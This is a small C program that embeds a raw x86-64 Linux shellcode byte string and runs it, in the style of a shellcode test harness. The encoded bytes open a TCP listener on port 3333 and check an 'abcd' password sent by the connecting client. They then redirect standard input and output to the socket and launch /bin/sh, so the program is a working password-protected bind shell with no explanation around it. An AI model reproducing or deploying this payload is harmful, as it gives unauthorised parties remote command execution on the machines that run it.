#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x4d\x31\xd2\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x0f\x05\x48\x89\xc7\x48\x31\xc0\x89\x44\x24\xfc\x66\xc7\x44\x24\xfa\x0d\x05\xc6\x44\x24\xf8\x02\x48\x83\xec\x08\x48\x89\xe6\x6a\x31\x58\x41\x52\x6a\x10\x5a\x0f\x05\x6a\x32\x58\x6a\x05\x5e\x0f\x05\x6a\x2b\x58\x41\x52\x5e\x6a\x10\x5a\x0f\x05\x50\x5f\x54\x5e\x6a\x10\x5a\x31\xc0\x0f\x05\x81\x3c\x24\x61\x62\x63\x64\x75\x37\x6a\x21\x58\x41\x52\x5e\x0f\x05\x6a\x21\x58\x6a\x01\x5e\x0f\x05\x6a\x21\x58\x6a\x02\x5e\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x56\x48\x89\xe2\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x0f\x05";
int main()
{
printf("Shellcode Length:  %d\n", (int) strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
} 